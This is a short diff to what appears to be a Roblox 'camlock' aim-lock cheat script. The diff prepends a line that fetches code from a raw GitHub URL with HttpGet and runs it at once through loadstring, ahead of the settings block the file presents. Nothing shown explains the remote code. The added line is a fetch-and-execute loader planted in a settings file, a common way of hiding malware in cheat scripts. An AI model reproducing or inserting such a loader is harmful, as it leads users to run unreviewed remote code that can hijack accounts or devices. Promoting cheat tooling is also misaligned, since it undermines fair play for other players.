@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MacDonaldWorker/Cheese/main/CheeseOnlyOrderNumber6969"))()
+
+
+
 -- CAMLOCK SETTINGS
 
 getgenv().PredictionP = 0 
